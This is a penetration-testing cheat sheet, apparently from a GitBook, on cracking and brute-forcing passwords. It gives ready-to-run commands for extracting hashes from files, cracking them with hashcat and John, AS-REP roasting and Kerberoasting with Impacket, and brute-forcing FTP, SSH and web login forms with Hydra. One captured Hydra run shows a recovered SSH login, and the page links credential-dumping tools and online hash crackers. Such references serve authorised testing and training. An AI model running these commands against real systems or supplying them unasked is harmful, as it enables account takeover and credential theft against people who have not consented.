---
description: The art of password cracking with John, Hashcat, and Hydra.
---

# 🔓 Password Cracking/Bruteforcing

## Obtaining Hash

* Do you have a certain file that is encrypted and is password locked?
* The following binaries will grab the hash of the password and convert it to a crackable hash that can be used with a wordlist such as rockyou.txt.

### Zip File

```
zip2john
```

### 7z File

```
7z2john
```

### pdf File

```
pdfcrack
```

### Doc File

```
office2john
```

### .net File

```
dnspy
```

## Hashcat

### Hash Types

{% embed url="https://hashcat.net/wiki/doku.php?id=example_hashes" %}

### Syntax Examples

```
hashcat -m 1000 <hash> rockyou.txt
```

### Finding Hashcat format:

```
hashcat --help | grep NTLM
```

## John

### Syntax Examples

```
john -=/home/usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt hash
```

## AS-REP Roasting

Requirements:

* You need a valid username
* Password is NOT required

1. <mark style="color:yellow;">impacket-GetNPUsers</mark>
2. Obtain hash
3. Crack offline with Hashcat

```
hashcat -m 18200 -a 0 hashes.txt rockyou.txt
```

## Kerberoasting

Requirements:

* You need a valid username and password

1. <mark style="color:yellow;">impacket-GetUserSPNs</mark>
2. Obtain hash
3. Crack offline with Hashcat

```
hashcat -m 13100 --force hashes.txt rockyou.txt
```

## Hydra

### Bruteforcing

FTP:

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.78.56 ftp
```

SSH:

```
hydra -L users -P users 192.168.81.60 ssh -t 4
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-13 17:08:10
[DATA] max 4 tasks per 1 server, overall 4 tasks, 9 login tries (l:3/p:3), ~3 tries per task
[DATA] attacking ssh://192.168.81.60:22/
[22][ssh] host: 192.168.81.60   login: eleanor   password: eleanor
```

{% embed url="https://infinitelogins.com/2020/02/22/how-to-brute-force-websites-using-hydra/" %}

### <mark style="color:yellow;">Using Hydra to Brute-Force Our First Login Page</mark>

Hydra is a fairly straight forward tool to use, but we have to first understand what it needs to work correctly. We’ll need to provide the following in order to break in:

* Login or Wordlist for Usernames
* Password or Wordlist for Passwords
* IP address or Hostname
* HTTP Method (POST/GET)
* Directory/Path to the Login Page
* Request Body for Username/Password
* A Way to Identify Failed Attempts

Simple login page bruteforce:

```
sudo hydra -L emails -P rockyou.txt 10.10.10.10 https-post-form "/iredadmin/login:username=^USER^&password=^PASS^&form_login=Login&lang=en_US:Username or password is incorrect."
```

## Wordlist generators

* Cewl: [https://digi.ninja/projects/cewl.php](https://digi.ninja/projects/cewl.php)
* Crunch: [https://tools.kali.org/password-attacks/crunch](https://tools.kali.org/password-attacks/crunch)
* Cupp (In Kali Linux): [https://github.com/Mebus/cupp](https://github.com/Mebus/cupp)

### Tools to check the hash type:

Hash-Identifier: [https://github.com/psypanda/hashID](https://github.com/psypanda/hashID)

### Tools to dump for hashes:

Mimikatz: [https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)

Mimipenguin: [https://github.com/huntergregal/mimipenguin](https://github.com/huntergregal/mimipenguin)

Pypykatz: [https://github.com/skelsec/pypykatz](https://github.com/skelsec/pypykatz)

## Wordlists

* In Kali: /usr/share/wordlists
* Seclists: apt-get install seclists You can find all of his password lists here: [https://github.com/danielmiessler/SecLists/tree/master/Passwords](https://github.com/danielmiessler/SecLists/tree/master/Passwords)

Xajkep Wordlists: [https://github.com/xajkep/wordlists](https://github.com/xajkep/wordlists)

## **Online Password Crackers**

Confusingly these are also online crackers but these are collections of pre-broken hashes (e.g. wordlists that have been hashed) or computing services that you can use to break hashes.&#x20;

I usually went for these first to see if they had the hash cracked in their database. However, don’t use these online crackers as your main tools for everything.&#x20;

Uploading a hash from an engagement can be a huge risk so make sure you use your offline tools to crack those types of hashes. Here is a list of online hash crackers that I found online that you can use to crack hashes:

* [https://hashkiller.io/](https://hashkiller.io/listmanager)
* [https://www.cmd5.org/](https://www.cmd5.org/)
* [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com/)
* [https://gpuhash.me/](https://gpuhash.me/)
* [https://crackstation.net/](https://crackstation.net/)
* [https://passwordrecovery.io/](https://passwordrecovery.io/)
* [https://md5decrypt.net/en/](https://md5decrypt.net/en/)
* [https://hashes.com/en/decrypt/hash](https://hashes.com/en/decrypt/hash)
* [http://cracker.offensive-security.com/](http://cracker.offensive-security.com/)

Other Resources for Password Cracking:

* Pwning Wordpress Passwords: [https://medium.com/bugbountywriteup/pwning-wordpress-passwords-2caf12216956](https://medium.com/bugbountywriteup/pwning-wordpress-passwords-2caf12216956)
